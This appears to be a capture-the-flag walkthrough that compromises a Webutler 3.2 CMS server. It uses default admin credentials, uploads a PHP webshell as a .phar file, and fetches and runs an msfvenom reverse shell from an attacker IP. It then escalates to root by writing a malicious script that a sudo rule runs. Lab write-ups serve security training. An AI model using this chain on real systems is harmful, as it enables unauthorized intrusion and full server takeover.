There is only port 80 open

When we look at the robots.txt file on the webserver, we see that there is a /_docs_ endpoint

On that endpoint, we see there is a /en/_start.htm page, which has information about the CMS app being used

webutler 3.2

If we searchsploit this software, we see that there is a RCE hack through uploading a .phar file

If we navigate to the /login endpoint, we can login with default credentials admin:admin

Once logged in, we can use the media button to upload files

We create a webshell.phar file with the following contents

<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>

Which we pair with a shell.elf binary with a reverse shell:

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.1.250 LPORT=443 -f elf > shell.elf

Once uploaded, if we click on the magnifying glass icon, we can see the file path for the uploaded file, so we upload the reverse shell file, make it executable, and run it

wget http://10.10.1.250/shell.elf
chmod %2bx shell.elf
./shell.elf

Once on, we see that there are sudo -l permissions

/usr/bin/python3 /opt/backup/backup.py

The backup directory is writable, and the backup.py file is missing

So we can write our own script

echo 'import os;os.system("/bin/bash -i")' > /opt/backup/backup.py

sudo /usr/bin/python3 /opt/backup/backup.py
